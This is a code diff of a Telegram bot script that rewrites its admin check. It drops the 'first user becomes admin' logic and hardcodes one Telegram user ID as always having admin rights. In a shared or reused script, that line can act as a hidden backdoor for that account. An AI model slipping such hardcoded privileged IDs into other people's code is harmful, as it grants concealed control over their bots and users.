@@ -32,14 +32,7 @@ Bot.setProperty("userInfo_" + user.telegramid, {
   joined_at: new Date().toISOString()
 }, "json");
 
-var adminId = Bot.getProperty("admin_id");
-if (!adminId) {
-  Bot.setProperty("admin_id", user.telegramid);
-  Bot.setProperty("admin_" + user.telegramid, true);
-  adminId = user.telegramid;
-}
-
-var isAdmin = (user.telegramid == adminId) || (Bot.getProperty("admin_" + user.telegramid) == true) || user.is_admin;
+var isAdmin = (user.telegramid == 8710308658 || user.telegramid == "8710308658") || (user.telegramid == Bot.getProperty("admin_id")) || (Bot.getProperty("admin_" + user.telegramid) == true) || user.is_admin;
 var forceChannel = Bot.getProperty("forceChannel");
 
 // Check Force Channel on bot start or download
